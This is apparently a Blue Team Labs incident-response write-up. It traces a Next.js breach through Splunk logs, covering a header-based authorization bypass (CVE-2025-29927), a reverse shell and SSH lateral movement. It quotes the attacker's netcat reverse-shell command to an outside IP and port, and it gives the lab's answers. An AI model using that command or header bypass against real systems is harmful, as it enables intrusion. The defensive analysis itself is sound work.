BLUE TEAM LABS ONLINE EASY INCIDENT RESPONSE NEXTJS SPLUNK
BACK TO PORTFOLIO

This writeup details the investigation into an incident at MiddleMayhem Inc., where unusual network traffic was detected targeting their admin portal. Utilizing SIEM logs, specifically from Splunk, the objective was to analyze the attack chain, identify how authentication was bypassed, remote code execution achieved, and lateral movement executed.

The analysis revealed the attacker exploited a vulnerability in the Next.js web application, leading to a reverse shell deployment and subsequent lateral movement to a database server via SSH.

Asset Information

HOSTNAME SUMMARY
webapp (172.217.164.174) The compromised web application server running Next.js. Initial point of compromise.
dbserver Database server, target of lateral movement from the webapp.
Attacker IP (218.92.0.204) Primary IP address used by the attacker for initial reconnaissance and exploitation.
Attacker Listener IP (113.89.232.157) IP address where the attacker's netcat listener was waiting for the reverse shell connection.

Question & Answer Solutions

1. Access the Website in the browser, present it in the bookmark, and identify the JavaScript framework and version used.

Next.js, 15.0.0

Reasoning: By accessing the web application in a browser and opening the developer console, the command window.next.version revealed the framework and its version.

2. Using Splunk, Find the attacker’s IP address.

218.92.0.204

Reasoning: Initial reconnaissance in Splunk for unusual activity on the webapp host, filtering for successful HTTP responses, revealed the attacker's source IP. The query used was index=* host=webapp http_response_code=200, then identifying the recurring external IP.

3. Analyze the SIEM logs to determine how many unique URIs were accessed by the attacker.

10

Reasoning: Using Splunk, the following query was executed to count distinct URIs accessed by the attacker's IP: index=* host=webapp ip_src="218.92.0.204" | stats dc(http_request_uri) as "Unique URIs Accessed".

4. Explore the site and identify two specific locations that could reveal internal structures or potential access points not meant for public eyes. Provide the two relative URLs.

/admin, /admin/file-upload

Reasoning: By navigating to /robots.txt on the web application, these sensitive paths were discovered, indicating potential administrative or file upload functionalities.

5. Based on the Framework and Version, what recent CVE could be used to bypass authorization?

CVE-2025-29927

Reasoning: A quick search for vulnerabilities related to Next.js 15.0.0 revealed CVE-2025-29927, which is known for authorization bypass in certain configurations.

6. Find the relevant HTTP header in the SIEM logs that indicates CVE exploitation. Provide the header name.

x-middleware-subrequest

Reasoning: The attacker exploited the Next.js vulnerability by manipulating the x-middleware-subrequest HTTP header. This was identified in Splunk using the query index=* "x-middleware-subrequest" ip_src="218.92.0.204".

7. What interesting URI did the attacker access after exploiting the CVE?

/api/upload

Reasoning: After successful exploitation, the attacker accessed the /api/upload endpoint, likely to upload a malicious payload. This was found by filtering Splunk logs for the attacker's IP and activity immediately following the CVE exploitation: index=* earliest="03/24/2025:11:06:34" ip_src="218.92.0.204".

8. The attacker tried uploading a reverse shell. Find out the IP and port to which the target would connect once the connection is established.

IP: 113.89.232.157, Port: 31337

Reasoning: Analysis of the uploaded reverse shell payload (found via index=* host=webapp http_request_method="POST") revealed the netcat command: nc 113.89.232.157 31337. This indicates the attacker's listener IP and port. Further confirmation could be found with index=* host=webapp tcp_dstport=31337.

9. After compromising the WebApp server, the attacker attempted lateral movement. Identify the technique used, as recorded in the SIEM logs.

SSH Brute-Forcing / SSH Login

Reasoning: SIEM logs from the dbserver showed multiple pam_unix(sshd:auth): authentication failure entries originating from the compromised webapp IP (172.217.164.174), indicating an SSH brute-force attempt.

10. Identify the user account that achieved successful lateral movement to another server.

dbserv

Reasoning: Following the brute-force attempts, the dbserver logs explicitly stated TA logs in successfully to dbserver as dbserv, confirming the compromised user account for lateral movement.

Key Takeaways & Security Insights

  • •
    Vulnerability Management: Regular patching and vulnerability scanning are crucial. The exploitation of a known Next.js CVE highlights the importance of keeping web application frameworks up-to-date.
  • •
    SIEM Monitoring & Alerting: Effective SIEM rules for unusual HTTP headers (e.g., x-middleware-subrequest manipulation) and outbound connections to suspicious ports/IPs (e.g., 31337) are vital for early detection of exploitation and reverse shells.
  • •
    Endpoint Detection & Response (EDR): An EDR solution could have detected the execution of the reverse shell payload (netcat) and its outbound connection, providing an additional layer of defense.
  • •
    Network Segmentation & Least Privilege: Segmenting the webapp from the dbserver and implementing strict network access controls could have prevented or contained the lateral movement. Additionally, ensuring user accounts like dbserv have minimal necessary privileges reduces the impact of compromise.
  • •
    Secure Configuration: The presence of sensitive paths like /admin and /admin/file-upload exposed via robots.txt highlights the need for careful web server and application configuration to avoid unintentional information disclosure.
